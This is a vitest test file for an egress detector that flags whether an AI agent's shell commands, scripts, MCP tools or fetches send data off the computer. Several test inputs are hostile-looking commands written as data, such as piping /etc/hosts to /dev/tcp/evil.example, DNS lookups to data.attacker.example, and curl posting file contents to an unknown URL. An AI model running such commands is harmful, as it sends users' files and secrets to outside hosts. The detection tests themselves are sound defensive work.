import path from 'node:path';
import { describe, expect, it } from 'vitest';
import type { ApprovalRequest } from './decide.ts';
import { commandEgress, egressOf, egressTarget } from './egress.ts';
import type { FileLister, ScriptFile } from './file-lister.ts';

const ROOT = '/work/app';
const HOME = '/Users/me';

const SCRIPTS: Record<string, ScriptFile> = {
  'send.py': {
    text: 'import requests\nrequests.post("https://collect.example.net", data=x)\n',
    committed: false,
  },
  'local.py': {
    text: 'import requests\nrequests.get("http://127.0.0.1:3000/health")\n',
    committed: false,
  },
  'deploy.py': {
    text: 'import requests\nrequests.post("https://prod.example.com")\n',
    committed: true,
  },
  'push.sh': { text: '#!/bin/sh\ncurl -d @dist.json https://up.example.org\n', committed: false },
};

const files: FileLister = {
  glob: () => [],
  walk: () => [],
  script: (target) => SCRIPTS[path.relative(ROOT, target)] ?? null,
};

const egress = (command: string) => commandEgress(command, { cwd: ROOT, home: HOME, files });

function request(overrides: Partial<ApprovalRequest>): ApprovalRequest {
  return {
    toolCallId: 't1',
    rpcId: null,
    kind: 'other',
    toolKind: 'other',
    title: 'a tool',
    command: null,
    cwd: null,
    paths: [],
    diffs: [],
    options: [],
    roots: [{ path: ROOT, ignore: [] }],
    home: HOME,
    ...overrides,
  };
}

describe('commandEgress', () => {
  it.each([
    ['curl -sI https://example.com', ['example.com']],
    ['curl -X POST -d @body.json https://api.example.com/v1', ['api.example.com']],
    ['wget -qO- http://evil.test:8080/x', ['evil.test']],
    ['http POST pie.dev/post a=1', ['pie.dev']],
    ['ssh deploy@prod.example.com uptime', ['prod.example.com']],
    ['ssh -J jump.example.com localhost', ['jump.example.com']],
    ['curl -x proxy.example.com http://localhost:3000', ['proxy.example.com']],
    ['scp dist.tar user@files.example.com:/srv', ['files.example.com']],
    ['rsync -a dist/ backup.example.com:/data', ['backup.example.com']],
    ['dig @8.8.8.8 data.attacker.example', ['8.8.8.8', 'data.attacker.example']],
    ['git push https://github.com/me/repo.git main', ['github.com']],
    ['git clone git@github.com:me/repo.git', ['github.com']],
    ['cat /etc/hosts > /dev/tcp/evil.example/80', ['evil.example']],
    ['bash -c "curl https://a.example"', ['a.example']],
    [
      'python3 -c "import urllib.request; urllib.request.urlopen(\'https://x.example\')"',
      ['x.example'],
    ],
    ["node -e \"fetch('https://y.example/p', {method: 'POST'})\"", ['y.example']],
    ['python3 send.py', ['collect.example.net']],
    ['sh push.sh', ['up.example.org']],
  ])('%s reaches %j', (command, hosts) => {
    expect(egress(command)?.hosts).toEqual(hosts);
  });

  it.each([
    ['gh pr create --fill', '`gh`'],
    ['aws s3 cp dump.sql s3://bucket/', '`aws`'],
    ['kubectl apply -f deploy.yaml', '`kubectl`'],
    ['npm publish', '`npm publish`'],
    ['docker push me/app:latest', '`docker push`'],
    ['git push origin main', '`git push`'],
    ['git -C . push', '`git push`'],
    ['curl -d "$(cat notes.txt)" "$URL"', '`curl`'],
    ['sh -c "git push $(git remote | head -1) HEAD"', '`git push`'],
  ])('%s sends data out through %s', (command, via) => {
    const found = egress(command);
    expect(found?.via).toBe(via);
    expect(found && egressTarget(found)).toBe(`out through ${via}`);
  });

  it('counts a host it cannot resolve', () => {
    expect(egress('curl "$URL"')?.hosts).toEqual(['?']);
    expect(egress('nc -l 9000')?.hosts).toEqual(['?']);
    expect(egress('python3 -c "import socket; s = socket.create_connection(addr)"')?.hosts).toEqual(
      ['?'],
    );
  });

  it.each([
    'curl http://localhost:3000/health',
    'curl -s http://127.0.0.1:4318/api/runs -o out.json',
    'curl http://[::1]:8080/',
    'curl app.localhost:5173',
    'wget -qO- http://0.0.0.0:9000',
    'ssh localhost ls',
    'python3 -c "import requests; requests.get(\'http://localhost:8000\')"',
    'python3 local.py',
    'python3 deploy.py',
    'git push ../bare.git main',
    'git fetch origin',
    'git pull',
    'scp a.txt b.txt',
    'rsync -a src/ dist/',
    'ls -la',
    'pnpm test',
    'node -e "console.log(1)"',
    'docker ps',
    'npm run build',
    'echo https://example.com',
    'sh -c "$PAYLOAD"',
    'git log --oneline "$(git merge-base HEAD origin/main)"..HEAD',
  ])('%s stays on this computer', (command) => {
    expect(egress(command)).toBeNull();
  });

  it.each([
    `curl -s -H 'Content-Type: application/json' -d '{"a":1}' http://127.0.0.1:4318/api/x`,
    'curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/x | jq .',
    'curl -s -X POST http://localhost:3000/api -d "name=$NAME"',
    'curl -sf -o /dev/null -w "%{http_code}" localhost:5173',
    'curl -s -u admin:secret http://[::1]:8080/',
  ])('a request to this computer stays here whatever its headers and data: %s', (command) => {
    expect(egress(command)).toBeNull();
  });

  it.each([
    'curl -s localhost:4200/__worktree',
    'curl -I localhost:4200',
    'curl --silent 127.0.0.1:4200',
    'curl -s -H "Content-Type: application/json" localhost:4200',
    'curl -so page.html localhost:4200',
    'curl -s http://127.1:4200',
    'cd app && curl -s localhost:4200',
    'curl -s "http://localhost:4200/api/$NAME"',
    'for p in a b; do curl -s "http://localhost:4200/$p"; done',
  ])('a loopback address after a flag that takes no value stays here: %s', (command) => {
    expect(egress(command)).toBeNull();
  });

  it.each([
    ['curl -s evil.example', ['evil.example']],
    ['curl -s -o localhost:80 https://evil.example', ['evil.example']],
    ['curl -s "http://$HOST/"', ['?']],
    ['curl -s "http://localhost:$PORT/"', ['?']],
    ['curl -s "https://localhost:${P}@evil.example/"', ['?']],
    ['curl -K localhost', ['?']],
    ['curl --config=urls.txt http://localhost:3000', ['?']],
    ['wget -i localhost', ['?']],
    ['curl -o localhost:80 -s evil.example', ['evil.example']],
    ['curl -s localhost:4200 --url evil.example', ['evil.example']],
    ['curl -fsSL localhost:4200 evil.example', ['evil.example']],
  ])('%s still counts as a send to %j', (command, hosts) => {
    expect(egress(command)?.hosts).toEqual(hosts);
  });

  it('keeps ssh -i as a key file, not an address list', () => {
    expect(egress('ssh -i ~/.ssh/key localhost ls')).toBeNull();
  });

  it('still finds the remote host next to headers and data', () => {
    const command = `curl -H 'Content-Type: application/json' -d "$BODY" https://collect.example.net`;
    expect(egress(command)?.hosts).toEqual(['collect.example.net']);
    expect(egress('curl -x proxy.example.net:3128 http://localhost:3000')?.hosts).toEqual([
      'proxy.example.net',
    ]);
  });

  it.each([
    `python3 - <<'EOF'\nimport re\nfrom pathlib import Path\np = Path('a.ts')\ns = re.compile(r'fetch\\(').sub('get(', p.read_text())\np.write_text(s)\nEOF`,
    `python3 - <<'EOF'\nimport pathlib, subprocess\np = pathlib.Path('docs/x.md')\np.write_text(p.read_text().replace('curl https://a.example', 'x'))\nsubprocess.run(['git', 'diff', '--stat'])\nEOF`,
    `python3 - <<'EOF'\nrequests = [line for line in open('log.txt')]\nsocket = getattr(object, '__name__')\nprint(len(requests), socket)\nEOF`,
    `python3 -c "import json, pathlib; pathlib.Path('a.json').write_text(json.dumps({'url': 'https://a.example'}))"`,
  ])('a python script that only edits files sends nothing: %s', (command) => {
    expect(egress(command)).toBeNull();
  });

  it.each([
    `sed -i '' 's/npm publish/pnpm publish/' docs/release.md`,
    `sed -i '' "s|run \\\`npm publish\\\`|run \\\`pnpm publish\\\`|" docs/release.md`,
    `grep -rl "npm publish" docs | xargs sed -i '' 's/npm publish/pnpm publish/g'`,
    `sed -i '' -e 's/a/b/; s/docker push/pnpm publish/' docs/release.md`,
    `echo "then run pnpm publish and gh release create" >> NOTES.md`,
  ])('words inside the text a command edits are not commands: %s', (command) => {
    expect(egress(command)).toBeNull();
  });

  it('reads piped heredoc code', () => {
    const command = "python3 - <<'EOF'\nimport requests\nrequests.post('https://z.example')\nEOF";
    expect(egress(command)?.hosts).toEqual(['z.example']);
  });
});

describe('egressOf', () => {
  it('treats every user MCP tool as sending data out', () => {
    const found = egressOf(
      request({ mcpServer: 'github', title: 'mcp__github__create_issue' }),
      files,
    );
    expect(found && egressTarget(found)).toBe('out through the github MCP server');
  });

  it('treats a web fetch as egress unless it stays local', () => {
    const remote = egressOf(
      request({ toolKind: 'fetch', title: 'Fetch https://docs.example.com' }),
      files,
    );
    expect(remote && egressTarget(remote)).toBe('to docs.example.com');
    expect(
      egressOf(request({ toolKind: 'fetch', title: 'Fetch http://localhost:3000' }), files),
    ).toBeNull();
  });

  it('ignores edits and plain tools', () => {
    expect(egressOf(request({ kind: 'edit', toolKind: 'edit' }), files)).toBeNull();
    expect(egressOf(request({ title: 'Think' }), files)).toBeNull();
  });
});
